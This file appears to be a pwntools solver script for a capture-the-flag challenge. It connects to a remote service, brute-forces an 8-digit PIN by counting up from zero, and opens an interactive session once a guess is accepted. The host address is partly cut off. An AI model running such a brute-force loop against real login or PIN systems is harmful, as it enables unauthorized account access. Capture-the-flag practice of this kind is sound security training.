#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    remote_service = ".155:18701"
    remote_service = remote_service.strip().split(":")


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

def cmd(choice):
    ru(b'> ')
    sl(i2b(choice))
def register():
    cmd(1)
def login(data):
    cmd(2)
    ru(b'PASSWD: ')
    sl(data)
def pin(data):
    cmd(3)
    ru(b'PIN code: ')
    sl(data)

i = 0
io = remote(remote_service[0], int(remote_service[1]))
while 1:
    i += 1
    pin(str(i).rjust(8, "0").encode())
    if b'Wrong PIN code' not in rl():
        print(i)
        input()
        ia()




ia()
